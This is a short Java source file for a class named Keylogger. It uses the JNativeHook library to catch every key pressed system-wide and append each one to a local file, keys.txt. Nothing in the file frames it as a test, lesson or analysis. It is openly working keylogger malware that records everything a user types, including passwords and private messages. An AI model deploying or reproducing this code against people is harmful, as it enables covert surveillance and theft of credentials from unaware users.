package com.wilhelm.konsza;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Keylogger implements NativeKeyListener {


    private static final Path file = Paths.get("keys.txt");


    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        //empty
    }

    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1)
                writer.print("[" + keyText + "]");
            else
                writer.print(keyText);

        } catch (IOException ex) {
            System.exit(-1);
        }

    }

    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        //empty
    }
}
